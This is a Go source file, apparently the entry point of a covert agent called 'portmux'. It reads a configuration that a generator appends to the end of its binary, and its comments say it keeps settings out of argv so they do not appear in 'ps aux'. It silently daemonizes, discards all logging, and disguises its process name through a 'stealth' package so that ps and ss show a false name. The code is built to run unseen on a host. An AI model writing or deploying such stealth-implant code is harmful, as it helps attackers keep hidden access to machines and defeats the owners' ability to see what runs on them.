package main

import (
	_ "embed"
	"io"
	"log"
	"os"
	"runtime"
	"strings"
	"syscall"

	"portmux/internal/agent"
	"portmux/internal/stealth"
)

//go:embed config.yaml
var embeddedConfig []byte

// 追加配置块标记 (生成器写入二进制尾部, 运行时读取, 优先级最高)
const (
	cfgBeginMarker = "\n--PMCFG1--\n"
	cfgEndMarker   = "\n--PMEND1--\n"
)

// loadAppendedConfig 读取自身二进制尾部追加的配置块。
// 生成器把完整目标配置写在 server ELF 尾部, 部署时无需任何参数/环境变量。
func loadAppendedConfig() []byte {
	exe, err := os.Executable()
	if err != nil {
		return nil
	}
	data, err := os.ReadFile(exe)
	if err != nil {
		return nil
	}
	begin := strings.LastIndex(string(data), cfgBeginMarker)
	if begin < 0 {
		return nil
	}
	start := begin + len(cfgBeginMarker)
	end := strings.Index(string(data[start:]), cfgEndMarker)
	if end < 0 {
		return nil
	}
	return data[start : start+end]
}

// daemonize 重新执行自身: 新会话 + 标准流接 /dev/null, 当前进程立即退出。
// 失败时回退为前台运行 (可用性优先)。
func daemonize() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	devnull, err := os.OpenFile(os.DevNull, os.O_RDWR, 0)
	if err != nil {
		return
	}
	defer devnull.Close()
	attr := &os.ProcAttr{
		Env:   append(os.Environ(), "PORTMUX_DAEMON=1"),
		Files: []*os.File{devnull, devnull, devnull},
		Sys:   &syscall.SysProcAttr{Setsid: true},
	}
	if _, err := os.StartProcess(exe, []string{exe}, attr); err != nil {
		return // 守护化失败, 回退前台
	}
	os.Exit(0)
}

// 零参数启动:
//   1. 优先使用编译期嵌入的 config.yaml;
//   2. 可选运行时覆盖 (不通过 argv, 避免 ps aux 泄露):
//      PORTMUX_CONFIG=路径       → 读取配置文件
//      PORTMUX_CONFIG_YAML=内容 → 直接读取内联 yaml (server.sh 用)
func main() {
	// 钉住主线程: 后续 HideProcess 的 prctl 必须落在 m0 上
	// (ps/ss 读 /proc/PID/comm = 主线程 comm); 不先钉住的话,
	// 守护化子进程的 main goroutine 可能已被调度到其他线程,
	// prctl 改名落空, comm 仍是二进制文件名。
	runtime.LockOSThread()

	// 无痕化启动:
	//   - 默认静默: 只有 PORTMUX_DEBUG=1 (或前台调试 PORTMUX_FOREGROUND=1) 才输出日志;
	//   - 前台直接运行时自动守护化 (re-exec + setsid, 父进程立即退出):
	//     终端瞬间回到提示符, 无输出、无 sudo 包装进程残留;
	//     server.sh 已用 setsid 托管, 会传 PORTMUX_DAEMON=1 跳过二次守护化。
	debug := os.Getenv("PORTMUX_DEBUG") == "1" || os.Getenv("PORTMUX_FOREGROUND") == "1"
	if !debug {
		log.SetOutput(io.Discard)
	}
	log.SetFlags(0)

	if os.Getenv("PORTMUX_DAEMON") != "1" && os.Getenv("PORTMUX_FOREGROUND") != "1" {
		daemonize()
	}

	cfg := agent.DefaultConfig()
	if err := agent.DecodeYAML(embeddedConfig, cfg); err != nil {
		log.Fatalf("embedded config: %v", err)
	}
	if p := os.Getenv("PORTMUX_CONFIG"); p != "" {
		data, err := os.ReadFile(p)
		if err != nil {
			log.Fatalf("read config: %v", err)
		}
		if err := agent.DecodeYAML(data, cfg); err != nil {
			log.Fatalf("parse config: %v", err)
		}
	}
	if inline := os.Getenv("PORTMUX_CONFIG_YAML"); inline != "" {
		if err := agent.DecodeYAML([]byte(inline), cfg); err != nil {
			log.Fatalf("parse inline config: %v", err)
		}
	}
	// 二进制尾部追加配置 (生成器写入, 优先级最高)
	if appended := loadAppendedConfig(); len(appended) > 0 {
		if err := agent.DecodeYAML(appended, cfg); err != nil {
			log.Fatalf("appended config: %v", err)
		}
	}

	// 尽早设置进程名: Go 调度器会把 goroutine 迁移到其他线程,
	// 越晚调用 prctl 越可能落在非主线程上 (ps 读取的是主线程 comm)
	if cfg.Stealth.ProcessName != "" {
		stealth.HideProcess(cfg.Stealth.ProcessName)
	}

	a, err := agent.New(cfg)
	if err != nil {
		log.Fatal(err)
	}

	if err := a.Start(); err != nil {
		log.Print(err)
		a.Cleanup()
		os.Exit(1)
	}
	a.Cleanup()
}
